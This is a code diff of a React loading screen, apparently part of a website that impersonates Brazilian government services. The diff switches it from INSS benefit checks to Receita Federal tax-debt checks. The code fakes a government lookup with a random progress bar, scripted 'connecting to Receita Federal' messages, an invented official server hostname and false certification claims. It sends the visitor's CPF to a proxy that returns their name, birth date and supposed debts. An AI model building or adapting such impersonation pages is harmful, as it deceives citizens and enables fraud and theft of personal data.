@@ -26,8 +26,8 @@ interface LoadingScreenProps {
 const steps = [
   { icon: Fingerprint, title: "Autenticação", subtitle: "Validando identidade" },
   { icon: Database, title: "Base de Dados", subtitle: "Acessando registros" },
-  { icon: FileSearch, title: "Análise Social", subtitle: "Verificando benefícios" },
-  { icon: Server, title: "DATAPREV", subtitle: "Sistema integrado" },
+  { icon: FileSearch, title: "Análise Fiscal", subtitle: "Verificando débitos" },
+  { icon: Server, title: "SERPRO", subtitle: "Sistema integrado" },
   { icon: CheckCircle, title: "Finalização", subtitle: "Gerando relatório" },
 ];
 
@@ -47,14 +47,17 @@ const LoadingScreen = ({ cpf, recaptchaToken, onComplete, onTabChange, fast = fa
     const speed = fast ? 0.5 : 1;
 
     const progressInterval = setInterval(() => {
-      setProgress((p) => { if (p >= 100) return 100; return Math.min(p + Math.random() * 8 + 2, 100); });
+      setProgress((p) => {
+        if (p >= 100) return 100;
+        return Math.min(p + Math.random() * 8 + 2, 100);
+      });
     }, 100);
 
     const statusMessages = [
-      { time: 200 * speed, text: "Conectando ao servidor do INSS..." },
-      { time: 600 * speed, text: "Autenticação concluída. Acessando base DATAPREV..." },
-      { time: 1000 * speed, text: "Cruzando informações de benefícios sociais..." },
-      { time: 1400 * speed, text: "Consultando sistema CadÚnico..." },
+      { time: 200 * speed, text: "Conectando ao servidor da Receita Federal..." },
+      { time: 600 * speed, text: "Autenticação concluída. Acessando base de dados..." },
+      { time: 1000 * speed, text: "Cruzando informações tributárias..." },
+      { time: 1400 * speed, text: "Consultando sistema SERPRO..." },
       { time: 1700 * speed, text: "Consolidando resultado da análise..." },
     ];
 
@@ -63,7 +66,9 @@ const LoadingScreen = ({ cpf, recaptchaToken, onComplete, onTabChange, fast = fa
       setTimeout(() => setActiveStep(2), 800 * speed),
       setTimeout(() => setActiveStep(3), 1200 * speed),
       setTimeout(() => setActiveStep(4), 1600 * speed),
-      ...statusMessages.map(({ time, text }) => setTimeout(() => setStatusText(text), time)),
+      ...statusMessages.map(({ time, text }) =>
+        setTimeout(() => setStatusText(text), time)
+      ),
     ];
 
     const fetchData = async () => {
@@ -76,26 +81,55 @@ const LoadingScreen = ({ cpf, recaptchaToken, onComplete, onTabChange, fast = fa
           supabase.functions.invoke("api-proxy", { body: { endpoint: "/pendencias", cpf, recaptchaToken, deviceId } }),
         ]);
 
+        // Device lock: the proxy returns HTTP 403 with { device_locked: true }
+        // supabase-js puts 4xx responses in error.context (a Response object)
         const checkDeviceLocked = async (res: { data: unknown; error: unknown }): Promise<boolean> => {
           const d = res.data as Record<string, unknown> | null;
           if (d?.device_locked === true) return true;
           const e = res.error as { context?: Response } | null;
           if (e?.context instanceof Response) {
-            try { const json = await e.context.clone().json(); if (json?.device_locked === true) return true; } catch { /* ignore */ }
+            try {
+              const json = await e.context.clone().json();
+              if (json?.device_locked === true) return true;
+            } catch { /* ignore */ }
           }
           return false;
         };
 
-        const [locked1, locked2] = await Promise.all([checkDeviceLocked(consultaRes), checkDeviceLocked(pendenciasRes)]);
-        if (locked1 || locked2) { onComplete({ nome: "DEVICE_LOCKED", nascimento: "--/--/----", sexo: "N/A", pendencias: [] }); return; }
+        const [locked1, locked2] = await Promise.all([
+          checkDeviceLocked(consultaRes),
+          checkDeviceLocked(pendenciasRes),
+        ]);
+
+        if (locked1 || locked2) {
+          onComplete({
+            nome: "DEVICE_LOCKED",
+            nascimento: "--/--/----",
+            sexo: "N/A",
+            pendencias: [],
+          });
+          return;
+        }
 
         const consultaData = consultaRes.data;
         const pendenciasData = pendenciasRes.data;
 
-        const consultaOk = consultaData?.success === true && consultaData?.nome && typeof consultaData.nome === "string" && consultaData.nome.trim().length > 0 && consultaData?.dataNascimento && typeof consultaData.dataNascimento === "string" && consultaData.dataNascimento.trim().length > 0;
+        // Only proceed if /consulta returned a valid successful response with real CPF data
+        // Requires both nome AND dataNascimento to be non-empty strings
+        const consultaOk =
+          consultaData?.success === true &&
+          consultaData?.nome &&
+          typeof consultaData.nome === "string" &&
+          consultaData.nome.trim().length > 0 &&
+          consultaData?.dataNascimento &&
+          typeof consultaData.dataNascimento === "string" &&
+          consultaData.dataNascimento.trim().length > 0;
 
         if (!consultaOk) {
-          clearInterval(progressInterval); timers.forEach(clearTimeout); setProgress(0);
+          // API didn't return valid data — block all navigation, stay stuck
+          clearInterval(progressInterval);
+          timers.forEach(clearTimeout);
+          setProgress(0);
           setStatusText("Erro ao processar a consulta. Verifique sua conexão e tente novamente.");
           return;
         }
@@ -114,71 +148,107 @@ const LoadingScreen = ({ cpf, recaptchaToken, onComplete, onTabChange, fast = fa
           pendencias: pendenciasData?.success ? pendenciasData.pendencias : [],
         });
       } catch {
-        clearInterval(progressInterval); timers.forEach(clearTimeout); setProgress(0);
+        // On any exception — block navigation, do not advance
+        clearInterval(progressInterval);
+        timers.forEach(clearTimeout);
+        setProgress(0);
         setStatusText("Erro ao processar a consulta. Verifique sua conexão e tente novamente.");
       }
     };
 
     setTimeout(() => fetchData(), 500);
-    return () => { clearInterval(progressInterval); timers.forEach(clearTimeout); };
+
+    return () => {
+      clearInterval(progressInterval);
+      timers.forEach(clearTimeout);
+    };
   }, [cpf, onComplete]);
 
   return (
     <div className="min-h-screen bg-background flex flex-col">
       <GovHeader cpf={cpf} />
+
       <div className="w-full bg-primary/5 border-b border-border py-1.5 sm:py-2">
         <div className="mx-auto max-w-3xl px-4 flex items-center justify-between text-[9px] sm:text-xs text-muted-foreground">
           <div className="flex items-center gap-1.5 sm:gap-2">
             <Lock className="h-2.5 sm:h-3 w-2.5 sm:w-3 text-accent" />
             <span>Sessão segura • TLS 1.3</span>
           </div>
-          <span className="hidden sm:inline">Servidor: dataprev-prod.inss.br</span>
-          <span className="sm:hidden">dataprev-prod</span>
+          <span className="hidden sm:inline">Servidor: srf-prod-03.receita.fazenda.gov.br</span>
+          <span className="sm:hidden">srf-prod-03</span>
         </div>
       </div>
 
       <div className="flex-1 flex items-center justify-center px-4 py-6 sm:py-10">
         <div className="w-full max-w-3xl animate-fade-in-up">
           <div className="text-center mb-6 sm:mb-8">
-            <h1 className="text-lg sm:text-2xl font-extrabold text-foreground tracking-tight">Consultando Benefícios</h1>
+            <h1 className="text-lg sm:text-2xl font-extrabold text-foreground tracking-tight">Processando Consulta</h1>
             <p className="mt-1 text-xs sm:text-sm text-muted-foreground">
               CPF: <span className="font-semibold text-foreground font-mono">{formatCpf(cpf)}</span>
             </p>
           </div>
 
+          {/* Progress bar */}
           <div className="mx-auto mb-2 max-w-lg">
             <div className="flex items-center justify-between mb-1.5 sm:mb-2">
               <span className="text-[10px] sm:text-xs font-medium text-muted-foreground">Progresso da consulta</span>
               <span className="text-[10px] sm:text-xs font-bold text-primary font-mono">{Math.round(progress)}%</span>
             </div>
             <div className="h-2 sm:h-2.5 overflow-hidden rounded-full bg-secondary">
-              <div className="h-full rounded-full gradient-loading transition-all duration-300 ease-out" style={{ width: `${progress}%` }} />
+              <div
+                className="h-full rounded-full gradient-loading transition-all duration-300 ease-out"
+                style={{ width: `${progress}%` }}
+              />
             </div>
           </div>
 
+          {/* Status text */}
           <div className="text-center mb-6 sm:mb-8">
             <p className="text-[10px] sm:text-xs text-muted-foreground italic">{statusText}</p>
           </div>
 
+          {/* Steps */}
           <div className="mb-6 sm:mb-8 grid grid-cols-5 gap-1 sm:gap-2">
             {steps.map((step, i) => {
               const Icon = step.icon;
               const isActive = i <= activeStep;
               const isCurrent = i === activeStep;
               return (
-                <div key={i} className={`rounded-lg sm:rounded-xl border p-2 sm:p-3 text-center transition-all duration-500 ${isCurrent ? "border-primary/40 bg-primary/5 shadow-md" : isActive ? "border-accent/30 bg-card" : "border-transparent bg-card/30"}`}>
+                <div
+                  key={i}
+                  className={`rounded-lg sm:rounded-xl border p-2 sm:p-3 text-center transition-all duration-500 ${
+                    isCurrent
+                      ? "border-primary/40 bg-primary/5 shadow-md"
+                      : isActive
+                        ? "border-accent/30 bg-card"
+                        : "border-transparent bg-card/30"
+                  }`}
+                >
                   <div className="mb-1 sm:mb-2 flex justify-center">
-                    <div className={`flex h-7 w-7 sm:h-9 sm:w-9 items-center justify-center rounded-lg transition-all duration-500 ${isCurrent ? "gradient-primary shadow-sm animate-pulse" : isActive ? "bg-accent/10" : "bg-muted"}`}>
-                      <Icon className={`h-3 w-3 sm:h-4 sm:w-4 transition-colors duration-500 ${isCurrent ? "text-primary-foreground" : isActive ? "text-accent" : "text-muted-foreground/30"}`} />
+                    <div className={`flex h-7 w-7 sm:h-9 sm:w-9 items-center justify-center rounded-lg transition-all duration-500 ${
+                      isCurrent
+                        ? "gradient-primary shadow-sm animate-pulse"
+                        : isActive
+                          ? "bg-accent/10"
+                          : "bg-muted"
+                    }`}>
+                      <Icon className={`h-3 w-3 sm:h-4 sm:w-4 transition-colors duration-500 ${
+                        isCurrent ? "text-primary-foreground" : isActive ? "text-accent" : "text-muted-foreground/30"
+                      }`} />
                     </div>
                   </div>
-                  <h3 className={`text-[9px] sm:text-xs font-bold transition-colors duration-500 leading-tight ${isActive ? "text-foreground" : "text-muted-foreground/40"}`}>{step.title}</h3>
+                  <h3 className={`text-[9px] sm:text-xs font-bold transition-colors duration-500 leading-tight ${
+                    isActive ? "text-foreground" : "text-muted-foreground/40"
+                  }`}>
+                    {step.title}
+                  </h3>
                   <p className="mt-0.5 text-[8px] sm:text-[9px] text-muted-foreground leading-tight hidden sm:block">{step.subtitle}</p>
                 </div>
               );
             })}
           </div>
 
+          {/* Security notice */}
           <div className="rounded-xl sm:rounded-2xl border border-border bg-card p-3 sm:p-4 shadow-sm">
             <div className="flex items-start gap-2 sm:gap-3">
               <div className="flex h-8 w-8 sm:h-9 sm:w-9 shrink-0 items-center justify-center rounded-lg sm:rounded-xl bg-accent/10">
@@ -187,7 +257,7 @@ const LoadingScreen = ({ cpf, recaptchaToken, onComplete, onTabChange, fast = fa
               <div>
                 <h4 className="font-bold text-foreground text-xs sm:text-sm">Ambiente Seguro</h4>
                 <p className="mt-0.5 text-[10px] sm:text-xs text-muted-foreground leading-relaxed">
-                  Processamento em ambiente certificado INSS. Dados transmitidos com criptografia AES-256.
+                  Processamento em ambiente certificado ICP-Brasil. Dados transmitidos com criptografia AES-256.
                 </p>
               </div>
             </div>
